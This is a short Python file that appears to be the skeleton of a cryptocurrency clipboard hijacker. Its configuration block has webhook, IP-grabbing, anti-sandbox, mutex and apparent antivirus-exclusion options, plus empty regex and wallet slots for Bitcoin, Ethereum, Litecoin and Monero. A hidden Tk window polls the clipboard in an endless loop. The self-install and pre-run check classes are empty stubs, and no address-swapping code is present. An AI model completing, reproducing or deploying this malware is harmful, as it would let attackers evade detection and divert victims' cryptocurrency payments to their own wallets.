import tkinter as tk
import requests
import time
import re
import os

CONFIG = {
    "webhook": "",
    "ping": False,
    "grab_ip": False,

    "mutex": True,
    "anti_sandbox": True,
    "try_exclude": True,
    "delay": 0.25,
    
    "btc_regex": "",
    "eth_regex": "",
    "ltc_regex": "",
    "xmr_regex": "",
     
    "BTC": "",
    "ETH": "",
    "LTC": "",
    "XMR": ""
}

class run_point:
    @staticmethod
    def run():
        root = tk.Tk()
        root.withdraw()

        old_clipboard = None

        while True:
            try:
                current_clipboard = root.clipboard_get()
            except tk.TclError:
                pass
            time.sleep(0.1)

class pre_run_checks:
    pass

class install_self:
    pass

if __name__ == "__main__":
    run_point.run()